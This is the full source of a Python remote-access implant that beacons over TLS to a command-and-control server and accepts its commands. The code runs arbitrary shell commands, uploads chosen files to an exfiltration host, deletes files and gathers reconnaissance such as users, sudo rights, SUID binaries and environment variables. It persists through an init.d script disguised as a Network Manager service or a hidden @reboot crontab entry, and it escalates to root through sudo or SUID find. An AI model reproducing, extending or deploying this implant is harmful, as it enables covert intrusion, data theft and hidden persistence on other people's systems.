#!/usr/bin/env python3
# Python 3.5-compatible implant. Compiled to a stripped ELF via PyInstaller.
import json
import os
import random
import shutil
import socket
import ssl
import struct
import subprocess
import sys
import time

try:
    from urllib.request import urlopen, Request
except ImportError:
    from urllib2 import urlopen, Request

from helper import (
    decrypt_message,
    deobfuscate,
    deserialize_public_key,
    encrypt_message,
    generate_keypair,
    obfuscate,
    serialize_public_key,
)

C2_HOST = os.environ.get("C2_HOST", "127.0.0.1")
C2_PORT = int(os.environ.get("C2_PORT", "443"))
EXFIL_HOST = os.environ.get("EXFIL_HOST", C2_HOST)
EXFIL_PORT = int(os.environ.get("EXFIL_PORT", "8443"))
BEACON_MIN = float(os.environ.get("BEACON_MIN", "4"))
BEACON_MAX = float(os.environ.get("BEACON_MAX", "12"))

# TLS - accept any cert since the C2 uses an ephemeral self-signed cert
_tls_ctx = ssl.create_default_context()
_tls_ctx.check_hostname = False
_tls_ctx.verify_mode = ssl.CERT_NONE

def _get_user():
    user = os.environ.get("USER") or os.environ.get("USERNAME")
    if not user:
        try:
            import pwd
            user = pwd.getpwuid(os.getuid()).pw_name
        except Exception:
            user = str(os.getuid())
    return user

_data_store = {
    "hostname": socket.gethostname(),
    "os": sys.platform,
    "user": _get_user(),
}


def _send(conn, data):
    conn.sendall(struct.pack(">I", len(data)) + data)


def _recv(conn):
    hdr = b""
    while len(hdr) < 4:
        c = conn.recv(4 - len(hdr))
        if not c:
            raise ConnectionError("closed")
        hdr += c
    length = struct.unpack(">I", hdr)[0]
    buf = b""
    while len(buf) < length:
        c = conn.recv(length - len(buf))
        if not c:
            raise ConnectionError("closed")
        buf += c
    return buf


class _Shutdown(Exception):
    pass


def _ok(rid, payload):
    return {"type": "RESPONSE", "request_id": rid, "status": "OK", "payload": payload}


def _err(rid, code, message):
    return {"type": "ERROR", "request_id": rid, "error": {"code": code, "message": message}}


def _run(cmd, timeout=10):
    """Run a shell command, return (stdout_str, returncode)."""
    try:
        proc = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT
        )
        out, _ = proc.communicate(timeout=timeout)
        return out.decode("utf-8", errors="replace").strip(), proc.returncode
    except subprocess.TimeoutExpired:
        proc.kill()
        return "TIMEOUT", -1
    except Exception as exc:
        return "ERROR: {0}".format(exc), -1


def _handle(msg):
    command = msg.get("command", "")
    rid = msg.get("request_id", "")
    payload = msg.get("payload", {})

    if command == "HEARTBEAT":
        return _ok(rid, {"message": "alive"})

    elif command == "SHUTDOWN":
        raise _Shutdown(rid)

    elif command == "SYSINFO":
        info = {
            "hostname": socket.gethostname(),
            "platform": sys.platform,
            "user": os.environ.get("USER", os.environ.get("USERNAME", "?")),
            "cwd": os.getcwd(),
            "pid": os.getpid(),
        }
        try:
            info["ip"] = socket.gethostbyname(socket.gethostname())
        except Exception:
            info["ip"] = "unknown"
        try:
            with open("/proc/uptime") as fh:
                info["uptime_s"] = float(fh.read().split()[0])
        except Exception:
            pass
        return _ok(rid, info)

    elif command == "RUN_CMD":
        cmd = payload.get("cmd", "")
        if not cmd:
            return _err(rid, 400, "No cmd provided")
        try:
            proc = subprocess.Popen(
                cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            try:
                stdout, stderr = proc.communicate(timeout=15)
            except subprocess.TimeoutExpired:
                proc.kill()
                return _err(rid, 408, "Command timed out")
            return _ok(rid, {
                "cmd": cmd,
                "stdout": stdout.decode("utf-8", errors="replace").strip(),
                "stderr": stderr.decode("utf-8", errors="replace").strip(),
                "returncode": proc.returncode,
            })
        except Exception as exc:
            return _err(rid, 500, str(exc))

    elif command == "EXFIL_FILE":
        path = payload.get("path", "")
        if not path:
            return _err(rid, 400, "No path provided")
        try:
            with open(path, "rb") as fh:
                data = fh.read()
        except Exception as exc:
            return _err(rid, 500, "Read failed: {0}".format(exc))
        filename = os.path.basename(path)
        url = "https://{0}:{1}/u?filename={2}".format(EXFIL_HOST, EXFIL_PORT, filename)
        try:
            req = Request(url, data=data)
            urlopen(req, timeout=10, context=_tls_ctx)
            return _ok(rid, {"path": path, "bytes": len(data), "exfil_to": url})
        except Exception as exc:
            return _err(rid, 500, "Exfil POST failed: {0}".format(exc))

    elif command == "READ_DATA":
        key = payload.get("key", "")
        if key not in _data_store:
            return _err(rid, 404, "Key not found: {0!r}".format(key))
        return _ok(rid, {"key": key, "value": _data_store[key]})

    elif command == "WRITE_DATA":
        key = payload.get("key", "")
        value = payload.get("value", "")
        if not key:
            return _err(rid, 400, "No key provided")
        _data_store[key] = value
        return _ok(rid, {"message": "Stored {0!r}".format(key)})

    elif command == "DELETE_FILE":
        path = payload.get("path", "")
        if not path:
            return _err(rid, 400, "No path provided")
        try:
            os.remove(path)
            return _ok(rid, {"message": "Deleted {0}".format(path)})
        except Exception as exc:
            return _err(rid, 500, str(exc))

    elif command == "RECON_BUNDLE":
        # Multi-step recon: runs ~15 commands, returns combined report
        cmds = [
            ("whoami",         "whoami"),
            ("id",             "id"),
            ("hostname",       "hostname"),
            ("kernel",         "uname -a"),
            ("os_release",     "cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null"),
            ("network",        "ip addr 2>/dev/null || ifconfig 2>/dev/null"),
            ("listening",      "ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null"),
            ("arp",            "ip neigh 2>/dev/null || arp -n 2>/dev/null"),
            ("processes",      "ps aux --no-headers 2>/dev/null | head -30"),
            ("users",          "cat /etc/passwd | grep -vE '(nologin|false|sync|halt|shutdown)'"),
            ("sudo_check",     "sudo -n -l 2>&1"),
            ("suid_bins",      "find / -perm -u=s -type f 2>/dev/null | head -20"),
            ("crontabs",       "crontab -l 2>/dev/null; ls /etc/cron* 2>/dev/null"),
            ("writable_etc",   "find /etc /usr/local/bin /usr/bin -writable -type f 2>/dev/null | head -10"),
            ("home_files",     "find {0} -maxdepth 3 -type f 2>/dev/null | head -30".format(
                os.path.expanduser("~"))),
            ("env_vars",       "env"),
            ("disk",           "df -h 2>/dev/null"),
        ]
        results = {}
        for key, cmd in cmds:
            out, _ = _run(cmd, timeout=10)
            results[key] = out
        return _ok(rid, results)

    elif command == "PERSIST":
        # Multi-step persistence.
        # Root path: copy to /usr/lib/systemd-private/, install SysV init.d script + register it.
        # Non-root fallback: copy to ~/.cache/.sysd/, install @reboot crontab entry.
        steps = {}
        try:
            if getattr(sys, "frozen", False):
                implant_path = sys.executable
            else:
                implant_path = os.path.abspath(__file__)

            env_prefix = (
                "C2_HOST={c2h} C2_PORT={c2p} EXFIL_HOST={eh} EXFIL_PORT={ep}"
                " BEACON_MIN=4 BEACON_MAX=12"
            ).format(
                c2h=C2_HOST, c2p=str(C2_PORT),
                eh=EXFIL_HOST, ep=str(EXFIL_PORT),
            )

            is_root = (os.getuid() == 0)
            steps["running_as_root"] = is_root

            if is_root:
                # Root path: SysV init.d script
                # Binary goes to a path that looks like a legitimate system file
                persist_bin = "/usr/lib/network-manager/nm-dispatcher-event"
                try:
                    os.makedirs(os.path.dirname(persist_bin))
                except OSError:
                    pass
                shutil.copy2(implant_path, persist_bin)
                os.chmod(persist_bin, 0o755)
                steps["copy"] = persist_bin

                # Write the init.d script with a benign-looking name
                init_script = (
                    "#!/bin/sh\n"
                    "### BEGIN INIT INFO\n"
                    "# Provides: network-manager-dispatcher\n"
                    "# Required-Start: $syslog $remote_fs $network\n"
                    "# Required-Stop: $syslog $remote_fs\n"
                    "# Default-Start: 2 3 4 5\n"
                    "# Default-Stop: 0 1 6\n"
                    "# Short-Description: Network Manager Dispatcher\n"
                    "### END INIT INFO\n"
                    "case \"$1\" in\n"
                    "  start)\n"
                    "    setsid env {env} {bin} >/dev/null 2>&1 &\n"
                    "    ;;\n"
                    "esac\n"
                ).format(env=env_prefix, bin=persist_bin)

                init_path = "/etc/init.d/network-manager-dispatcher"
                with open(init_path, "w") as fh:
                    fh.write(init_script)
                os.chmod(init_path, 0o755)
                steps["init_script"] = init_path

                # Register with SysV runlevels
                rc_out, rc_code = _run("update-rc.d network-manager-dispatcher defaults")
                steps["update_rc"] = rc_out if rc_code == 0 else "failed: {0}".format(rc_out)

                # Also enable via systemctl if systemd is present (Ubuntu 16.04 has both)
                _run("systemctl daemon-reload 2>/dev/null")
                _run("systemctl enable network-manager-dispatcher 2>/dev/null")

                verify_out, _ = _run("ls -la {0} && ls /etc/rc2.d/ | grep network-manager-dispatcher".format(init_path))
                steps["verify"] = verify_out

            else:
                # Non-root fallback: crontab @reboot
                persist_dir = os.path.join(os.path.expanduser("~"), ".cache", ".sysd")
                try:
                    os.makedirs(persist_dir)
                except OSError:
                    pass
                persist_bin = os.path.join(persist_dir, ".dbus-daemon")

                if os.path.abspath(implant_path) != os.path.abspath(persist_bin):
                    shutil.copy2(implant_path, persist_bin)
                    os.chmod(persist_bin, 0o755)
                steps["copy"] = persist_bin

                cron_line = "@reboot {env} {bin} >/dev/null 2>&1\n".format(
                    env=env_prefix, bin=persist_bin
                )
                proc = subprocess.Popen(
                    "crontab -l 2>/dev/null",
                    shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                )
                existing, _ = proc.communicate()
                existing_str = existing.decode("utf-8", errors="replace")

                if persist_bin not in existing_str:
                    new_crontab = existing_str.rstrip("\n") + "\n" + cron_line
                    proc2 = subprocess.Popen(
                        "crontab -",
                        shell=True, stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    )
                    proc2.communicate(input=new_crontab.encode())
                    steps["crontab"] = "installed @reboot"
                else:
                    steps["crontab"] = "already present"

                steps["verify"], _ = _run("crontab -l")

            return _ok(rid, steps)
        except Exception as exc:
            return _err(rid, 500, "PERSIST failed: {0}".format(exc))

    elif command == "PRIVESC":
        #    enumerate privesc vectors, attempt escalation if found
        if os.getuid() == 0:
            return _ok(rid, {"status": "already_root", "uid": 0})

        steps = {
            "current_uid": str(os.getuid()),
            "current_user": os.environ.get("USER", os.environ.get("USERNAME", "?")),
        }

        # Check sudo NOPASSWD
        steps["sudo_check"], _ = _run("sudo -n -l 2>&1", timeout=5)

        # Check SUID binaries that have known escapes
        steps["suid_check"], _ = _run(
            "find / -perm -u=s -type f 2>/dev/null | grep -E '(python|find|vim|bash|perl|ruby|nmap|awk)'",
            timeout=10,
        )

        # Check writable sensitive files
        writable = [f for f in ["/etc/passwd", "/etc/sudoers", "/etc/sudoers.d"]
                    if os.access(f, os.W_OK)]
        steps["writable_sensitive"] = writable if writable else "none"

        escalated = False

        if getattr(sys, "frozen", False):
            implant_path = sys.executable
        else:
            implant_path = os.path.abspath(__file__)

        used_py_bin = None

        # Try sudo NOPASSWD + python
        for py_bin in ["python3.5", "python3", "python2.7", "python2", "python"]:
            if py_bin in steps["sudo_check"] and (
                "NOPASSWD" in steps["sudo_check"] or "ALL" in steps["sudo_check"]
            ):
                test_cmd = "sudo {0} -c \"import os; print(os.getuid())\" 2>/dev/null".format(py_bin)
                out, _ = _run(test_cmd, timeout=5)
                if out.strip() == "0":
                    steps["escalation"] = "SUCCESS via sudo {0} (uid=0)".format(py_bin)
                    escalated = True
                    used_py_bin = py_bin
                    break

        # Try sudo ALL / broad NOPASSWD
        if not escalated and "NOPASSWD" in steps["sudo_check"] and "ALL" in steps["sudo_check"]:
            out, _ = _run("sudo id 2>/dev/null", timeout=5)
            if "uid=0" in out:
                steps["escalation"] = "SUCCESS via sudo ALL (uid=0)"
                escalated = True

        # Try SUID find
        if not escalated and "find" in steps["suid_check"]:
            out, _ = _run("find . -exec /bin/sh -p -c 'id' \\; -quit 2>/dev/null", timeout=5)
            if "uid=0" in out or "root" in out:
                steps["escalation"] = "SUCCESS via SUID find"
                escalated = True

        if not escalated:
            steps["escalation"] = "no automatic vector found - review sudo_check and suid_check"
            return _ok(rid, steps)

        # Spawn a new root implant process via the confirmed sudo vector.
        # Writes a temp Python script then runs it via sudo python3.
        # The spawned process connects back to C2 as a new session.
        if used_py_bin:
            import tempfile
            spawn_src = (
                "import subprocess, os\n"
                "subprocess.Popen(\n"
                "    ['{bin}'],\n"
                "    env={{'C2_HOST':'{c2h}','C2_PORT':'{c2p}',"
                "'EXFIL_HOST':'{eh}','EXFIL_PORT':'{ep}',"
                "'BEACON_MIN':'4','BEACON_MAX':'12',"
                "'USER':'root','HOME':'/root'}},\n"
                "    close_fds=True\n"
                ")\n"
            ).format(
                bin=implant_path,
                c2h=C2_HOST, c2p=str(C2_PORT),
                eh=EXFIL_HOST, ep=str(EXFIL_PORT),
            )
            try:
                tf = tempfile.NamedTemporaryFile(
                    mode="w", suffix=".py", delete=False, dir="/tmp"
                )
                tf.write(spawn_src)
                tf.close()
                _run("sudo {0} {1}".format(used_py_bin, tf.name), timeout=5)
                os.unlink(tf.name)
                steps["root_spawn"] = "spawned - run c2> list to see root session"
            except Exception as exc:
                steps["root_spawn"] = "spawn failed: {0}".format(exc)

        return _ok(rid, steps)

    else:
        return _err(rid, 400, "Unknown command: {0!r}".format(command))


def beacon():
    while True:
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            with _tls_ctx.wrap_socket(raw, server_hostname=C2_HOST) as s:
                s.connect((C2_HOST, C2_PORT))

                priv_key, pub_key = generate_keypair()
                _send(s, serialize_public_key(pub_key))
                server_pub = deserialize_public_key(_recv(s))

                reg = {
                    "type": "REQUEST",
                    "command": "REGISTER",
                    "request_id": "reg-{0}".format(id(s)),
                    "payload": {
                        "hostname": _data_store["hostname"],
                        "os": _data_store["os"],
                        "user": _data_store["user"],
                    },
                }
                _send(s, obfuscate(encrypt_message(json.dumps(reg).encode(), server_pub)))
                ack_raw = _recv(s)
                json.loads(decrypt_message(deobfuscate(ack_raw), priv_key).decode())

                while True:
                    raw_msg = _recv(s)
                    msg = json.loads(decrypt_message(deobfuscate(raw_msg), priv_key).decode())
                    try:
                        resp = _handle(msg)
                    except _Shutdown as sig:
                        shut = _ok(str(sig), {"message": "Shutting down."})
                        _send(s, obfuscate(encrypt_message(json.dumps(shut).encode(), server_pub)))
                        return
                    _send(s, obfuscate(encrypt_message(json.dumps(resp).encode(), server_pub)))

        except (ConnectionRefusedError, ConnectionError, OSError):
            time.sleep(random.uniform(BEACON_MIN, BEACON_MAX))
        except Exception:
            time.sleep(random.uniform(BEACON_MIN, BEACON_MAX))


if __name__ == "__main__":
    beacon()
